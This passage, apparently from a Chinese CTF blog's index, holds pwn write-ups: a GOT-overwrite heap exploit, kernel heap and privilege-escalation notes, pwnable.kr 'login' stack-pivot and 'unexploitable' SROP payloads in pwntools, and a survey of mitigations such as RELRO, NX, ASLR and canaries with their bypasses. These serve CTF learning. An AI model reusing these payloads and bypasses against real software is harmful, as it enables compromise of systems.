0x20840\n```\n\n(3)再次劫持got表为system函数，释放Binsh字符chunk，getshell\n\n```\n#注释头\n\n#这里的chunk3就是fakechunk，也就是got表\nedit(3,0x50,flat('\\0'*14,flat(libc_address+libc.sym['system'])[:6]))\nadd(0x10,\"/bin/sh\\0\")\n#由于前一个释放的是chunk2，所以这里再次申请回来的索引还是2，可以多次运行程序尝试就可以知道，当前面某个的chunk为空时，申请的chunk会先填满前面的空的chunk索引。\ndelete(2)\nio.interactive()\n```\n\n▲制造fakechunk时，需要设置合法的size，不然如果fastbins中的chunk.fd指向fakechunk，而fakechunk的大小又不是该fastbins组中，那么程序会崩溃。所以在最开始设置大小时，就需要好好计算以下，通过调试看看got表中在free函数前能不能找到还没被延迟绑定的函数可以确定计算大小，或者看其它函数的got表最后三位也可以，这样才能制造合法size使得程序不会崩溃。这里用到的0x601ffa就是调试过程中发现能用的，并且还需要填充0xe，也就是14个字节。\n","tags":["overflow"],"categories":["PWN","pwn堆-overflow"]},{"title":"pwn-kernel_Heap总结","url":"/2021/08/14/pwn-kernel_Heap总结/","content":"\n一、SLUB和SLAB：内核的堆比用户的堆会简单很多，需要了解一些机制。\n\n1.分配的大小：也是类似对齐的，但也有点不同\n\nlinux下查看命令：cat /proc/slabinfo\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_12-46-27.png)\n\n可以看到kmalloc分为很多的大小，从大到小分别为8k->8字节，每个都相当于是一个桶，里面存储所有的空闲块或者非空闲块。所以当我们分配17字节时，得到的空间其实是32字节，5K字节得到的是8K字节的空间。这个在用堆溢出的时候需要用到。\n\n \n\n2.管理机制：单链表结构\n\n(1)申请原则：\n\n以一定大小的空闲chunk作为一个单链表，以fd串联，并且chunk的结构只有一个fd，不像用户态中有有头结构：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-14-21.png)\n\n如果申请期间改变了空闲链表第一个chunk的fd，那么再申请一次得到该chunk，然后再申请就得到修改后的fd。如上图，如果0xffff8880029f8000是对应slub桶大小的chunk空闲链表第一个，那么申请该大小chunk后得到的是0xffff8880029f8000，再申请一次就会得到0x6bc360。\n\n▲这个具体的管理结构不知道在哪，但是如果再申请该大小的chunk：\n\n①0x6bc360在被申请出来之前，其fd为一个有效的可用地址，比如\n\n0x6bc360 --> 0x6bc460，那么就会得到连续得到0x6bc360和0x6bc460。\n\n②0x6bc360在被申请出来之前，其fd为0，比如\n\n0x6bc360 --> 0x0，那么先得到0x6bc360，然后会从另一个桶中申请chunk，该大小的空闲链表桶就会废弃不再使用，相当于系统默认该桶用完。之后再申请该大小的chunk会从新桶中继续申请。\n\n③0x6bc360在被申请出来之前，其fd为无效地址，比如\n\n0x6bc360 --> 0x40，那么先得到0x6bc360，然后再申请，系统就会崩溃。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-25-50.png)\n\n \n\n(2)释放原则：\n\n同样是以一定大小的空闲chunk作为一个单链表，以fd串联，也类似fastbin结构，先进后出：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-38-53.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-39-01.png)\n\n这里可以看到，释放完三个chunk之后，再申请，会先得到chunk0，再得到chunk2，chunk1。所以这里也同样可以看出，在释放之后，该chunk的fd会被改写，指向下一个空闲chunk。只不过不用看size和其他七七八八的检查，只用fd即可打类似fastbin的攻击了，方便了很多。\n","tags":["kernelHeap-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwn-kernel_前置知识","url":"/2021/08/14/pwn-kernel_前置知识/","content":"\n一、内核前置基础知识：\n\n1.physmap：\n\nphysmap是内核管理的一块非常大的连续的虚拟内存空间，为了提高效率，该空间地址和RAM地址直接映射。RAM相对physmap要小得多，导致了任何一个RAM地址都可以在physmap中找到其对应的虚拟内存地址，而用户空间的虚拟内存也会映射到RAM。\n\n所以可能会形成如下关系：\n\nusr_data--->RAM---->physmap\n\n那么physmap中就有可能会保存usr_data，那么就为提权代码放到内核空间提供了前置条件，同时有mmap就可能会导致条件竞争。\n\n \n\n2.ioctl：系统调用，用于与设备通信\n\n由于内核和用户空间隔离开，所以就需要一个接口来使得用户可以在一定情况下访问内核空间：\n\nint ioctl(int fd, unsigned long request, ...)\n\n第一个参数为打开设备 (open) 返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。\n\n \n\n \n\n3.状态转换相关操作：\n\n当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换\n\nENTRY(entry_SYSCALL_64)\n\n(1).用户态至内核态：\n\n①swapgs指令触发，切换到kernel GS：\n\nSWAPGS_UNSAFE_STACK\n\n②保存栈值，设置内核栈：\n\nmovq %rsp, PER_CPU_VAR(rsp_scratch)\n\nmovq PER_CPU_VAR(cpu_current_top_of_stack), %rsp\n\n③压栈保存寄存器：\n\n```\n#注释头 \n\n/* Construct struct pt_regs on stack */\npushq  $__USER_DS      /* pt_regs->ss */\npushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */\npushq  %r11             /* pt_regs->flags */\npushq  $__USER_CS      /* pt_regs->cs */\npushq  %rcx             /* pt_regs->ip */\npushq  %rax             /* pt_regs->orig_ax */\npushq  %rdi             /* pt_regs->di */\npushq  %rsi             /* pt_regs->si */\npushq  %rdx             /* pt_regs->dx */\npushq  %rcx tuichu    /* pt_regs->cx */\npushq  $-ENOSYS        /* pt_regs->ax */\npushq  %r8              /* pt_regs->r8 */\npushq  %r9              /* pt_regs->r9 */\npushq  %r10             /* pt_regs->r10 */\npushq  %r11             /* pt_regs->r11 */\nsub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */\n```\n\n④判断类型并跳转：\n\n```\n#注释头\n\nmovq PER_CPU_VAR(current_task), %r11\ntestl $_TIF_WORK_SYSCALL_ENTRY|_TIF_ALLWORK_MASK, TASK_TI_flags(%r11)\njnz entry_SYSCALL64_slow_path\n```\n\n▲\n\n```\n#注释头\n\nentry_SYSCALL64_slow_path:\n  /* IRQs are off. */\n  SAVE_EXTRA_REGS\n  movq    %rsp, %rdi\n  call    do_syscall_64        /* returns with IRQs disabled */\n```\n\n(2)内核态至用户态：\n\n①swapgs恢复GS\n\n②iretq（加上寄存器信息）或sysretq，如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）\n\nkernel 的 crash 通常会引起重启\n\n \n\n \n\n4.相关保护技术Mitigation：\n\n(1)SMAP和SMEP保护技术：\n\n(arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never))\n\n①SMAP:禁止内核访问用户空间的数据(Supervisor Mode Access Prevention)\n\n②SMEP:禁止内核执行用户空间的代码(Supervisor Mode Execution Prevention)\n\n内核命令行中添加nosmap和nosmep禁用\n\n(2)kernel canary:\n\n编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。\n\n(3)KALSR：内核地址随机化\n\n \n\n \n\n5.提权代码与函数结构体：\n\ncred结构体：kernel用cred结构体记录进程权限(每个结构都有一个cred结构)，保存了进程的相关信息，如果利用这个cred就可以提权。一般调用commit_creds(prepare_kernel_cred(0))完成提权然后用户态“着陆”起shell。\n\n```\n#注释头\n\nstruct cred {\n    atomic_t    usage;\n#ifdef CONFIG_DEBUG_CREDENTIALS\n    atomic_t    subscribers;           /* number of processes subscribed */\n    void        *put_addr;\n    unsigned    magic;\n#define CRED_MAGIC  0x43736564\n#define CRED_MAGIC_DEAD 0x44656144\n#endif\n    kuid_t      uid;                   /* real UID of the task */\n    kgid_t      gid;                   /* real GID of the task */\n    kuid_t      suid;                  /* saved UID of the task */\n    kgid_t      sgid;                  /* saved GID of the task */\n    kuid_t      euid;                  /* effective UID of the task */\n    kgid_t      egid;                  /* effective GID of the task */\n    kuid_t      fsuid;                 /* UID for VFS ops */\n    kgid_t      fsgid;                 /* GID for VFS ops */\n    unsigned    securebits;            /* SUID-less security management */\n    kernel_cap_t    cap_inheritable;   /* caps our children can inherit */\n    kernel_cap_t    cap_permitted;     /* caps we're permitted */\n    kernel_cap_t    cap_effective;     /* caps we can actually use */\n    kernel_cap_t    cap_bset;          /* capability bounding set */\n    kernel_cap_t    cap_ambient;       /* Ambient capability set */\n#ifdef CONFIG_KEYS\n    unsigned char   jit_keyring;       /* default keyring to attach requested\n    /* keys to */\n    struct key __rcu *session_keyring; /* keyring inherited over fork */\n    struct key  *process_keyring;      /* keyring private to this process */\n    struct key  *thread_keyring;       /* keyring private to this thread */\n    struct key  *request_key_auth;     /* assumed request_key authority */\n#endif\n#ifdef CONFIG_SECURITY\n    void        *security;             /* subjective LSM security */\n#endif\n    struct user_struct *user;          /* real user ID subscription */\n    struct user_namespace *user_ns;    /* user_ns the caps and keyrings are relative to. */\n    struct group_info *group_info;     /* supplementary groups for euid/fsgid */\n    struct rcu_head rcu;               /* RCU deletion hook */\n} __randomize_layout;\n```\n\n不同内核版本的cred结构体可能不太一样。\n\n \n\n二、内核态函数及相关变化：\n\n1.printf() -> printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果\n\n2.malloc() -> kmalloc()，内核态的内存分配函数，和malloc()相似，但使用的是slab/slub分配器。\n\n3.free() -> kfree()，同 kmalloc()\n\n4.memcpy() -> copy_from_user()/copy_to_user()\n\n5.copy_from_user() 实现了将用户空间的数据传送到内核空间\n\n6.copy_to_user() 实现了将内核空间的数据传送到用户空间\n\n7.提权相关函数：\n\n```\n#注释头\n\nint commit_creds(struct cred *new)\nstruct cred* prepare_kernel_cred(struct task_struct* daemon)\n```\n\n执行commit_creds(prepare_kernel_cred(0))即可获得 root 权限\n\n函数地址可在/proc/kallsyms，老版本/proc/ksyms中查看(cat|grep)，权限一般需要root\n\n \n\n \n\n三、保护绕过技术：\n\n1.ret2usr:\n\n在没有SMAP/SMEP的情况下把内核指针重定向到用户空间的漏洞利用方式被称为ret2usr\n\n2.ret2dir：\n\n如果用户空间用mmap()把提权代码映射到内存RAM，那么就可以在physmap里找到其对应的副本，就可以修改EIP跳到副本执行，这种利用方式被称为ret2dir。\n\n3.kernel canary:\n\n绕过方法同用户空间的canary绕过大致相同，编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。\n\n \n\n \n\n \n\n \n\n \n","tags":["Kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwnable.kr-login","url":"/2021/08/14/pwnable.kr-login/","content":"\n1.常规checksec一下，开了canary和NX，然后IDA打开分析漏洞。发现auth函数中可能存在栈溢出：\n\n```\n#注释头\n\nint v4; // [esp+20h] [ebp-8h]\n------------------------------------\nmemcpy(&v4, &input, a1);\n```\n\n如果a1大于8h，而我们可以控制input，那么就可以造成栈溢出。再往上翻一下，发现就是将我们的输入通过一系列操作给到input，然后a1是input的长度。\n\n实际情况是将我们的输入给s，进行Base64解码，然后给v4，长度给v6。v4又给input，v6传值到达auth函数赋值给a1。这里input是全局变量，所以auth函数中的input中的内容其实就是我们输入经过base64解码的内容。\n\n```\n#注释头\n\n_isoc99_scanf(\"%30s\", &s);\n--------------------------------------------------\nv6 = Base64Decode((int)&s, &v4);\n--------------------------------------------------\nmemcpy(&input, v4, v6);\n------------------------------------------------------\nauth(v6) == 1\n```\n\n▲题外话：最开始Base64搞不懂哪个是输入，哪个是输出，直接经过调试就可以判断。况且最开始的v4是0，总不能程序永远都将0进行base64解码然给到我们的输入地址中吧。但是调试的时候发现，每次输入相同的值，但是解码后得到的v4的值却是不一样的。这就纳闷了，为什么一样的输入四个AAAA得到的解码值不一样呢，难道程序还有个随机变量不成。之后再仔细调试发现这个base64decode有点不一样，虽然传入的两个参数都是地址，但是第一个参数的操作却是从该地址直接取值进行解码，然后对于第二个参数的操作却并不是将解码结果给到第二个参数，而是再开辟一块堆内存，之后将该堆内存的地址给到第二个参数。所以每次解码后第二个参数，也就是栈上的一个值，总是不一样，因为这里保存的是一个随机生成的堆地址，而不是解码后的值。同样之后观察main函数中的memcpy也可以发现：memcpy(&input, v4, v6);而memcpy的原型是：\n\n```\n#注释头\n\nvoid *memcpy(void *dest, const void *src, size_t n)\n```\n\n前两个参数类型都应该是地址才对，而这里却直接将v4的值给传进去，那不就说明v4的值是一个地址吗。然后再跳转到汇编代码分析一波:\n\n```\n#注释头\n\n.text:080493B3   call _memset\n.text:080493B8   mov dword ptr [esp+18h], 0\n.text:080493C0   lea eax, [esp+18h]\n.text:080493C4   mov [esp+4], eax\n.text:080493C8   lea eax, [esp+1Eh]\n.text:080493CC   mov [esp], eax\n.text:080493CF   call Base64Decode\n```\n\n同样Base64Decode函数的两个参数也都是地址，这里是直接取栈地址给到eax，然后再将eax的值给相应esp指向的栈内存。所以可以看到Base64Decode取值应该是从栈上取两个地址才对，分别位于main函数栈的是esp+4和esp。所以如果这里有个格式化字符串那么就完全可以泄露处出栈地址，之后就完全可控，可惜没有。还是回到正轨分析吧。\n\n2.所以经过前面分析，程序要求我们输入一个base64编码过的字符串，随后会进行解码并且复制到位于bss段的全局变量input中，最后使用auth函数进行验证，通过后进入带有后门的correct()打开shell。并且由于长度有限制：所以我们的输入base64解码后最多只能有12个字节。\n\n```\n#注释头\n\nif ( v6 > 12 )\n{\n    puts(\"Wrong Length\");\n}\n```\n\n3.汇总一下，程序存在栈溢出，但只能溢出4个字节，也就是一个地址，也就是最多只能覆盖到ebp，然后存在后门函数。由于没办法直接覆盖返回地址，所以这里就在ebp上做文章，使用栈劫持技术。之前的栈劫持可以用rop，但是这里没办法，因为无法进行返回地址覆盖。但是还有一个地方，就是我们的输入最后会被解码赋值给input，这个input是个全局变量，不受到ASLR影响，而又可以控制12个字节，如果可以把栈挪移到这个地方，那么就是可控了。\n\n栈模型如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548702.png)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548716.png)\n\n可控栈如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548659.png)\n\n4.总体思路应该是：\n\n①劫持auth函数的栈底到input_addr，那么auth函数在退出到main函数时，main函数栈的栈底就不会回到之前的main函数栈栈底，而是会挪移到我们input_addr，也就是payload3的值。\n\n②开始执行auth函数中的退出操作，到leave时，执行操作leave的第一步汇编操作mov esp ebp，将栈顶指向ebp指向的内容，此时ebp已经被修改成了payload3，而payload3会被赋值成Input_addr，也就是esp会指向input_addr。\n\n②执行leave第二步汇编指令pop ebp，将当前栈顶的值赋值给ebp，也就是ebp的值会变成payload1，(这里的payload1没什么作用，可以随便填)之后esp由于pop，esp+0x4，会往栈底移动一个地址，移动到指向我们输入的payload2处。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548823.png)\n\n④之后retn执行，实际指令为pop eip，也就是将当前栈顶数据给eip，也就是eip被赋值为我们payload中的payload2。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548769.png)\n\n⑤最后执行retn的第二条实际指令：jmp eip，此时eip就已经是payload2的值，所以将该payload2设置为correct函数地址或者是system(\"/bin/sh\");就可以getshell。\n\n总的来说，就是利用leave和retn两个操作来劫持eip的值，使其直接指向后门函数，一步getshell。\n\n5.创建payload，组成应该是：\n\n```\n#注释头\n\n#首先确定地址：\ncorrect_addr = 0x08049278\ninput_addr = 0x0811eb40\n```\n\n之后确定payload的组成：\n\npayload = padding + eip + input_addr。\n\n```\n#注释头\n\npayload = \"aaaa\"\t\t\t\t#padding\npayload += p32(0x08049284)\t\t\n#system(\"/bin/sh\")地址，整个payload被复制到bss上，栈劫持后retn时栈顶在这里\npayload += p32(0x0811eb40)\t\t#新的eip地址\n```\n\n最后得注意发送的是base64编码之后的payload。\n\n \n\n参考资料:\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["hijackStack"],"categories":["PWN","hijackStack0x4"]},{"title":"pwn堆-IDA-0x01","url":"/2021/08/14/pwn堆-IDA-0x01/","content":"\n▲堆题一般都需要设置下IDA中的结构体：\n\n1.结构体设置：打开IDA-窗口-结构体(alt+4)。\n\n2.编辑-添加结构体类型，然后写名称(insert)。\n\n3.出现新增的struct之后，将鼠标放在该结构体ends位置，按d添加成员。\n\n4.将鼠标放在成员上，按d轮转设置成员大小，按u可删除成员。\n\n5.找到malloc的位置，判断好哪个变量是存放chunk和chunk_size，之后按y将其设置为:\n\nstruct struct_Name *array_Name[count]\n\n(一般都是这样的，题目会创建一个数组，每个元素是一个结构体，结构体里有两个数据成员，为chunk和chunk_size，这里的chunk就是Malloc返回的指针。不同题目具体分析，有的也有函数指针的数据成员void * fun_Name())\n\n6.设置增删改查函数的变量类型为void，不然if函数就有的难受了。\n\n7.将判断的成员变量什么的都设置好，按N改名，之后再来分析漏洞，不然很容易混淆。\n\n参考资料：\n\nhttps://blog.csdn.net/hgy413/category_1151311.html\n","tags":["IDA"],"categories":["PWN","pwn堆-IDA"]},{"title":"pwnable.kr-unexploitable","url":"/2021/08/14/pwnable.kr-unexploitable/","content":"\n1.常规checksec，只开启了NX。IDA打开找漏洞，程序很简单，读入数据栈溢出，可以读取1295个字节，但是buf只有0x10h大小，所以可以溢出足够长的数据。\n\n2.程序没有后门，没有导入system函数，没有binsh字符串，也没有write、put、printf之类的可以泄露libc的函数，没办法ROP，然后ROPgadget也搜不到syscall。这里换用另一种工具ropper来搜索：ropper --file=unexploitable --search \"syscall\"，可以搜到一个。有了syscall，可以尝试用rop来给寄存器赋值然后开shell，但是这里还是搜不到给rsi，rdi等寄存器赋值的gadget，这就意味着我们也没办法直接通过ROP实现getshell。\n\n3.如果没有开NX，直接栈劫持然后shellcode就完事了，但是开启了NX，没办法shellcode。\n\n4.啥也不管用的时候，可以用SROP，也就是通过syscall再利用SigreturnFrame来设置寄存器rsi和rid的值，加上字符串binsh可以直接getshell，不用非得设置rsi,rdi寄存器值的rop。但是这里使用SigreturnFrame有限制，需要溢出的长度较长一些，32位下需要依顺序布置栈，64位条件下需要往栈中布置一个结构体，所以需要输入足够长的payload来修改。\n\n5.这里使用的方案是SigreturnFrame，先考虑一段足够长的可修改的内存地址来给我们存放栈劫持的内容。但是在IDA中按ctrl+s查看内存段，发现所有的可改可读的内存段都特别小，没办法存放足够长的溢出内容。这里忽略了一个知识点，临时创建的缓存：也就是我们使用read(0, &buf, 0x50FuLL);时，会临时创建一个长度为0x50F的缓存区间，这个区间足够满足我们的需求，但是在IDA中找不到，那就没办法栈劫持到这个位置。这里可以先动态调试一下，由于没有开启PIE，程序加载后的基地址是固定的，所以无论程序加载多少次，地址仍然不会发生改变。那么转向动态调试，可以看到程序冒出来一个可读可写的内存段：unexploitable，这个就是临时创建的一个缓存区间，长度为F88，足够用来执行操作。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526527.png)\n\n6.在这个区间上任意选取一个地址来栈劫持，这里选择0x60116c，然后编写payload，尝试能否成功栈劫持并且读入binsh：\n\n```\n#注释头\n\npayload = \"\"\npayload += 'a'*16               #padding\npayload += p64(fake_stack_addr)\n#main函数返回时，将栈劫持到fake_stack_addr处，第一次将使得rbp变为fake_stack_addr, rbp + buf为fake_stack_addr - 0x10\npayload += p64(set_read_addr)   \n#汇编指令为lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read的地址处\nio.send(payload)\n```\n\n这样接下来如果再输入binsh字符串，就可以读取到[rbp+buf]处。需要注意的是，这里的set_read_addr是从下图最开始跳转，如果直接跳转call read，那么就会由于read取参是edx,rsi,edi，从而导致数据会存入rsi指向的地址，没办法存到我们劫持的栈中。观察read函数汇编代码可以知道，虽然read存入的地址是rsi，但是rsi是通过rbp+buf来赋值的，所以我们可以通过修改rbp为fake_stack，使得rbp+buf的地址变为fake_stack上的某个地址，再执行下图中的代码，就可以使得read读取的内容直接进入到劫持栈rbp+buf上，也就是fake_stack上。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526968.png)\n\n7.栈劫持完成之后，考虑第二段的payload，也就是输入binsh字符串和后续内容，来执行SigreturnFrame，使用：\n\n```\n#注释头\n\npayload = \"\"\npayload += \"/bin/sh\\x00\"\n```\n\n输入字符串binsh，存放在fake_stack_addr-0x10处\n\n```\n#注释头\n\npayload += 'a'*8 #padding\npayload += p64(fake_stack_addr+0x10)#存放在0x60116c处\n```\n\n读取完之后，执行leave指令之前的栈底为0x60116c，而leave指令相当于：mov rsp rbp；和pop rbp：\n\n(1)第一条mov rsp rbp之后，0x60116c就被赋值给rsp，也就是rsp指向0x60116c。\n\n(2)第二条pop rbp之后，把0x60116c处的内容赋值给rbp，这里设置0x60116c处的内容为fake_stack_addr+0x10，也就是0x60117c，那么rbp指向0x60117c。rsp下挪一个单位，指向0x60116c+0x08=0x601174。\n\n故leave指令执行完后rsp = 0x601174，rbp = 0x60117c。\n\n▲这里这么设置是有原因的，为了挪动rsp来指向0x601174。\n\n```\n#注释头\n\npayload += p64(call_read_addr)#存放在0x601174\n#存放在0x601174处，为了之后再次调用read修改rax。\n```\n\n接着执行retn指令，相当于pop eip，此时的rsp指向 0x601174，所以我们需要将0x601174处的值变为read_addr的地址，也就是这条语句，这里设置read_addr为0x400571，也就是带有call指令的read。\n\n```\n注释头\n\npayload += p64(fake_stack_addr)#存放在0x60117c，这里可以随便设置，用不到\n```\n\nretn指令之后就是call指令，各种寄存器的值还是没变，所以照常用就行，回来之后rsp仍旧指向0x60117c。此时栈状态为：\n\nrsp = 0x60117c，rbp = 0x60117c。\n\n```\n#注释头\n\npayload += str(frameExecve)#设置SigreturnFrame结构体\n\nio.send(payload)\n#set_read处的读取\n\nsleep(3)\n\n\nio.send('/bin/sh\\x00' + ('a')*7) \n#call_read处的读取。\n```\n\n读取15个字符到0x60115c，目的是利用read返回值为读取的字节数的特性设置rax=0xf，注意不要使/bin/sh\\x00字符串发生改变。\n\n最后io.interactive()即可getshell。\n\n▲总的程序流应该是：首次read->set_read->call_read->syscall\n\n结构体的设置，固定模式：\n\n```\n#注释头\n\nframeExecve = SigreturnFrame() #设置SROP Frame\nframeExecve.rax = constants.SYS_execve\nframeExecve.rdi = binsh_addr\nframeExecve.rsi = 0\nframeExecve.rdx = 0\nframeExecve.rip = syscall_addr\n```\n\n开头设置：\n\n```\n#注释头 \n\nsyscall_addr = 0x400560 \nset_read_addr = 0x40055b \nread_addr = 0x400571 \nfake_stack_addr = 0x60116c \nbinsh_addr = 0x60115c\n```\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"pwn保护措施","url":"/2021/08/14/pwn保护措施/","content":"\n一、RELRO: (ReLocation Read-Only)\n\n1.功能：解决延迟绑定问题，将符号重定向表设置为只读，或者在程序启动时就解析并绑定所有动态符号，防止got表被篡改。\n\n2.表现形式：\n\npwn checksec检查为RELRO: Full RELRO，Partial RELRO保护\n\n3.保护等级：\n\n(1)Partial RELRO:\n\n①一些段(.dynamic、.got等)在初始化后会被标记只读，.got段代表无plt指向的got表，也就是没有发生延迟绑定，没有被外部extern导入的函数被标记为只读。\n\n②但是有被外部extern导入的函数，发生延迟绑定的函数，在.got.plt段，仍然可以篡改got表，这里的got表是.got.plt段。\n\n(2)Full RELRO:直接禁止延迟绑定，无.got.plt段，只有.got段，且被标记为只读，无法修改，无法篡改got表。\n\n4.绕过方法：有啥绕过方法，不改got表不就完了。\n\n \n\n \n\n二、FORTIFY_SOURCE:\n\n1.功能：将敏感函数如read, fgets, memcpy, printf等等添加保护，替换为__read_chk, __fgets_chk, __memcpy_chk, __printf_chk等函数。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串漏洞的出现。（如直接%7$x）\n\n2.表现形式：带有chk的函数，checksec可以检测到\n\n3.保护等级：\n\n(1)-Ol -D_FORTIFY_SOURCE=0：关闭\n\n(2)-Ol -D_FORTIFY_SOURCE=1：替换get，memecpy等，格式化字符串仍然可用\n\n(3)-Ol -D_FORTIFY_SOURCE=2：格式化字符串也受到限制：\n\n%n，%3$x不可用(跳过了1，2不可用)\n\n%n$只能从1开始才可以：%1$x%2$x可用\n\n4.绕过方法：\n\n(1)利用整数溢出漏洞，篡改_IO_FILE结构中的_IO_FLAGS2_FORTIFY为0，从而关闭FORTIFY_SOURCE对%n的检查。之后再利用任意地址写，将nargs篡改为0，从而关闭对%n$的检查。\n\n具体论文：\n\n[http://phrack.org/issues/67/9.html](http://phrack.org/issues/67/9.html(要挂)\n\nhttps://jackgrence.github.io/phrack-67-9/\n\nhttps://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html\n\n都得挂vpn才能看\n\n \n\n \n\n \n\n三、NX:NX enabled (No execute bit)\n\n1.功能：将内存页以数据和指令两种方式进行了分类。被标记为数据页的内存页（如栈和堆）上的数据无法被当成指令执行，即没有X属性，这样就会导致shellcode失效。除了.text之外，其余段，数据(stack、heap等)都不可执行。\n\n2.表现形式：pwn checksec检查\n\n3.绕过方法：ROP、Onegadget、ret2libc等等\n\n \n\n \n\n \n\n四、ASLR(Address Space Layout Randomization)和PIE(Position Independent Executable)\n\n1.功能：该技术是一个针对堆、栈、libc地址、代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，每次加载程序都会随机化这些地址。\n\n2.表现形式：checksec检查，gdb-peda中输入aslr。\n\n3.不同：\n\n(1)ASLR是系统层面的地址随机，针对栈(stack)，libc加载地址，堆(heap)，没办法在编译时选择是否开启ASLR，不同系统设置下都不一样，只有在程序跑起来，远程调试才能看到随机化。可以在终端输入：\n\ncat /proc/sys/kernel/randomize_va_space\n\n查看当前系统的随机化等级，也可以打开这个文件进行修改等级。共分为3个等级：\n\nA.0：即关闭ASLR\n\nB.1：部分开启，随机化stack和libc加载地址，不随机化heap\n\nC.2：完全开启，随机化stack、libc加载地址、heap\n\n▲注：\n\n由于是系统层面的，做pwn题时肯定是不知道远程的系统环境到底有没有开启ASLR，一般都是默认开启，且都是2等级。做题做到现在没见过哪个题目告诉不开启ASLR的。另外在gdb-peda中查看aslr都是默认为off，因为gdb默认关闭ASLR，可以在gdb-peda中输入aslr on来打开ASLR。\n\n(2)PIE是gcc编译功能时的选项，针对代码段(.text)、初始化数据段(.data)、未初始化数据段(.bss)的防护技术。开启之后，以上提到的都会随机化，同样也是远程调试跑起来才能看到效果。需要注意的是，只有开启了ASLR之后，PIE才能被正常使用。\n\n4.绕过方法：\n\n(1)利用vsyscall或者vdso来滑过一段栈空间，从而将eip挪移到栈底下方我们想要的地址处。\n\n(2)利用栈溢出和打印函数的参数，修改劫持rbp使得利用rbp寻址的打印函数的参数指向栈上其它位置，通过爆破来寻求泄露Libc地址。\n\n(3)利用PIE机制，爆破倒数第四位可以跳转到同一个内存页中的任意函数。\n\n \n\n \n\n \n\n五、Stack Canary/Stack cookies\n\n1.功能：函数退出时，将保存在栈rbp-0x08处的canary和tcbhead_t结构体中的stack_guard来xor操作，若检查到改变则代表执行了栈溢出漏洞，程序调用__stack_chk_fail，打印错误信息，并崩溃。\n\n2.表现形式：\n\n```\n#注释头\n\nmov rax,fs:28h\nmov [rsp+28h+var_20], rax\n------------------------------------------------------\nmov rax, [rsp+28h+var_20]\nxor rax, fs:28h\ncall __stack_chk_fail\n------------------------------------------------------\nv_canary = __readfsqword(0x28u);\nreturn __readfsqword(0x28u) ^ v_canary;\n```\n\n3.不同类型的canary:\n\n(1)Terminator canaries:\n\n最常见的canary，末尾为\\x00，保存在rpb - 0x08的位置。\n\n(2).Random canaries:\n\n在程序初始化时随机生成，保存在一个相对安全的位置。通常由/dev/urandom来生成，有时也使用当前时间的哈希值。\n\n(3).Random XOR canaries:\n\n通过一个随机数和函数栈中所有控制信息，返回地址等异或运算得到的，这样当函数栈中的随机数或与之相关的控制信息，返回地址被修改了，都可以检测到。\n\n2.绕过方法：\n\n(1)有循环时，32或者64位程序下都可以逐字节爆破绕过。\n\n(2)可通过printf字符串漏洞来泄露(%p.%p.%p....)。\n\n(3)通过打印栈上数据的打印函数栈溢出连上canary泄露出来。\n\n(4)当程序读入flag进入内存时，利用函数__stack_chk_fail，加上足够长度的栈溢出覆盖argv[0]为程序中保存flag的地址。这样当__stack_chk_fail运行时就会打印出argv[0]中地址上对应的内容，也就是flag。\n\n(5)由pthread创建出来的线程函数中如果有足够长度的栈溢出，可以直接覆盖canary来源tcbhead_t结构体中的canary和栈中的canary为同一数值，这样检查仍旧通过。\n\n(64位中为fs:[28h]，32位中为gs:[14h])\n\n▲长度一般为rbp+2000左右，不同的Libc版本都不太一样，需要调试才能知道。原因是通过pthread出来的线程函数栈会被安置到与TLS相差约2000字节的距离处：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519177.png)    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519553.png)\n\n这里可以看到，第一个是main函数栈，第二个是在main函数中通过pthread进程创建并且调用的函数栈，两者相差将近0x700000000这么远，完全不是正常的函数调用相差的栈距离。同时在该函数中rbp指向的始终是0000(全是)，该函数结束后会先跳转到libc中的libpthread来恢复栈。\n\n▲64位的tcbhead_t结构体：\n\n```\n#注释头\n\ntypedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n               thread descriptor used by libpthread.  */\n  dtv_t 